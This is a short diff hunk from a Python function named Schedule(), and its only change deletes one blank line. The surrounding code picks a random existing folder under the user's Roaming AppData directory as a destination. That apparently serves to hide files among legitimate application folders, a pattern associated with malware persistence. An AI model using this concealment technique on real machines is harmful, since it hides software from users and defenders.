@@ -2756,7 +2756,6 @@ def Schedule():
         appdata_path = os.getenv('APPDATA')
         roaming_folder = os.path.join(appdata_path, 'Roaming')
         existing_folders = [folder for folder in os.listdir(roaming_folder) if os.path.isdir(os.path.join(roaming_folder, folder))]
-        
         if existing_folders:
             random_folder_name = random.choice(existing_folders)
             destination_folder = os.path.join(roaming_folder, random_folder_name)
